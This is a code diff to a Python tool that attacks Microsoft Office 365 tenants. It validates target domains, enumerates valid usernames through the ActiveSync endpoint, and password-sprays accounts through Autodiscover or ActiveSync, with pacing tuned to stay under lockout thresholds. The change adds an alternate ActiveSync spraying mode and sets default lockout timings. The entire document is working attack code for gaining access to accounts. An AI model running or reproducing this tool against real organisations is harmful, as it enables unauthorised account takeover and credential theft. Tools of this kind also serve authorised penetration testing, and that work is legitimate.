@@ -60,9 +60,10 @@ class Validator:
     default_url   = "https://login.microsoftonline.com/getuserrealm.srf?login=user@{DOMAIN}&xml=1"
     secondary_url = "https://login.microsoftonline.com/{DOMAIN}/.well-known/openid-configuration"
 
-    def __init__(self, domain, proxy=None, debug=False):
+    def __init__(self, domain, proxy=None, debug=False, secondary=False):
         self.domain = domain
-        self.url    = self.default_url.format(DOMAIN=self.domain)
+        self.url    = self.default_url if not secondary else self.secondary_url
+        self.url    = self.url.format(DOMAIN=self.domain)
         self.o365   = False
         self.debug  = debug
         self.proxy  = None if not proxy else {
@@ -103,16 +104,12 @@ class Enumerator:
     # Based on: https://bitbucket.org/grimhacker/office365userenum/
 
     loop = get_event_loop()
-
-    default_base = "outlook.office365.com"
-    default_url  = "https://{BASE}/Microsoft-Server-ActiveSync"
+    url  = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
 
     # User enumeration storage
     valid_accts = []
 
-    def __init__(self, username_list, domain=None, proxy=None, debug=False, threads=10):
-        domain     = self.default_base if not domain else domain
-        self.url   = self.default_url.format(BASE=domain)
+    def __init__(self, username_list, proxy=None, debug=False, threads=10):
         self.debug = debug
         self.proxy = None if not proxy else {
             "http": proxy, "https": proxy
@@ -155,24 +152,36 @@ class Enumerator:
 
 class Sprayer:
     """ Perform password spraying using Microsoft Autodiscover """
-    # Based on: https://github.com/sensepost/ruler/
-    #           https://github.com/byt3bl33d3r/SprayingToolkit/
+    # Primary Based on:   https://github.com/sensepost/ruler/
+    #                     https://github.com/byt3bl33d3r/SprayingToolkit/
+    # Secondary Based on: https://bitbucket.org/grimhacker/office365userenum/
 
     loop = get_event_loop()
 
-    default_url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
-    codes = {
+    primary_url   = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
+    primary_codes = {
         200: "VALID_CREDS",
         456: "FOUND_CREDS"
+    }
+
+    secondary_url   = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
+    secondary_codes = {
+        200: "VALID_CREDS",
+        403: "FOUND_CREDS"
+        # 401: "BAD_PASSWD"
+        # 404: "INVALID_USER"
     }
 
     # Password spray storage
     valid_creds = {}
 
-    def __init__(self, username_list, proxy=None, debug=False, threads=10):
-        self.url   = self.default_url
-        self.debug = debug
-        self.proxy = None if not proxy else {
+    def __init__(self, username_list, proxy=None, debug=False, threads=10, secondary=False):
+        self.url     = self.primary_url if not secondary else self.secondary_url
+        self.codes   = self.primary_codes if not secondary else self.secondary_codes
+        self.headers = None if not secondary else {"MS-ASProtocolVersion": "14.0"}
+        self.method  = get if not secondary else options
+        self.debug   = debug
+        self.proxy   = None if not proxy else {
             "http": proxy, "https": proxy
         }
         self.helper    = Helper()
@@ -191,19 +200,20 @@ class Sprayer:
         """ Password spray Microsoft using Microsoft Autodiscover """
         try:
             auth = (user, password)
-            rsp  = get(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
+            rsp  = self.method(self.url, headers=self.headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
 
             status = rsp.status_code
-            if status == 200:
-                print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
-                self.valid_creds[user] = password
+            output = "[%s%s%s] %s:%s"
 
-            elif status == 456:
-                print("[%s%s%s] %s:%s - Manually confirm (2FA, Locked, etc.)" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
+            if status in self.codes.keys():
+                if status != 200: output += " - Manually confirm (2FA, Locked, etc.)"
+                print(output % (text_colors.green, self.codes[status], text_colors.reset, user, password))
                 self.valid_creds[user] = password
 
             else:
-                print("[%s%s%s] %s:%s" % (text_colors.yellow, "INVALID", text_colors.reset, user, password))
+                output += " >>> Invalid user/password"
+                if status not in [401, 404]: output += " or unknown error [%s]" % status
+                print(output % (text_colors.red, "INVALID", text_colors.reset, user, password))
 
         except Exception as e:
             if self.debug: print("[ERROR] %s" % e)
@@ -217,14 +227,17 @@ if __name__ == "__main__":
     parser.add_argument("-p", "--password",  type=str,   help="Password(s) delimited using commas")
     parser.add_argument("-U", "--usernames", type=str,   help="File containing list of usernames")
     parser.add_argument("-P", "--passwords", type=str,   help="File containing list of passwords")
-    parser.add_argument("-c", "--count",     type=int,   help="Number of password attempts to run before resetting lockout timer")
-    parser.add_argument("-l", "--lockout",   type=float, help="Lockout policy reset time (in minutes)")
+    parser.add_argument("-c", "--count",     type=int,   help="Number of password attempts to run before resetting lockout timer. Default: 1", default=1)
+    parser.add_argument("-l", "--lockout",   type=float, help="Lockout policy reset time (in minutes). Default: 5 minutes", default=5.0)
     parser.add_argument("-d", "--domain",    type=str,   help="Domain name to validate against O365")
 
     parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>")
     parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=10)
     parser.add_argument("--output",  type=str, help="Output file name for enumeration and spraying")
     parser.add_argument("--debug",   action="store_true", help="Debug output")
+
+    parser.add_argument("--spray-secondary",    action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`")
+    parser.add_argument("--validate-secondary", action="store_true", help="Use `openid-configuration` for domain validation instead of `getuserrealm`")
 
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("-e", "--enum",     action="store_true", help="Perform username enumeration")
@@ -235,30 +248,30 @@ if __name__ == "__main__":
 
     # If validating the domain make sure we have the domain
     if args.validate and not args.domain:
-        parser.error("-d/--domain is required for domain validation.")
+        parser.error("-d/--domain is required for domain validation via -v/--validate.")
 
-    # If enumerating users make sure we have a username file
+    # If enumerating users make sure we have a username or username file
     if args.enum and (not args.username and not args.usernames):
-        parser.error("-u/--username or -U/--usernames is required when performing user enumeration.")
+        parser.error("-u/--username or -U/--usernames is required when performing user enumeration via -e/--enum.")
 
-    # If password spraying make sure we have all the information
-    if args.spray and ((not args.username and not args.usernames) or (not args.password and not args.passwords) or not args.count or not args.lockout):
-        parser.error("(-u/--username or -U/--usernames), (-p/--password or -P/--passwords), -c/--count" +
-            " and -l/--lockout are required when performing password spraying [--spray] you must specify.")
+    # If password spraying make sure we have username(s) and password(s)
+    if args.spray and ((not args.username and not args.usernames) or (not args.password and not args.passwords)):
+        parser.error("[-u/--username or -U/--usernames] and [-p/--password or -P/--passwords] are required" + 
+            " when performing password spraying via -s/--spray.")
 
     start  = time.time()
     helper = Helper()
 
     # Perform domain validation
     if args.validate:
-        validator = Validator(args.domain, proxy=args.proxy, debug=args.debug)
+        validator = Validator(args.domain, proxy=args.proxy, debug=args.debug, secondary=args.validate_secondary)
         validator.validate()
 
     # Perform user enumeration
     elif args.enum:
         # We chose to parse files first
         username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
-        enum = Enumerator(username_list, domain=args.domain, proxy=args.proxy, debug=args.debug, threads=args.threads)
+        enum = Enumerator(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads)
         enum.loop.run_until_complete(enum.run())
         helper.print_stats("User Enumeration", enum.valid_accts, ("valid_users.txt" if not args.output else args.output))
 
@@ -268,7 +281,7 @@ if __name__ == "__main__":
         username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
         password_list = helper.get_list_from_file(args.passwords) if args.passwords else args.password.split(',')
 
-        spray = Sprayer(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads)
+        spray = Sprayer(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)
 
         for password_chunk in helper.get_chunks_from_list(password_list, args.count):
             print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
@@ -279,4 +292,4 @@ if __name__ == "__main__":
         helper.print_stats("Password Spraying", spray.valid_creds, ("valid_credentials.txt" if not args.output else args.output))
 
     elapsed = time.time() - start
-    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))
+    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))
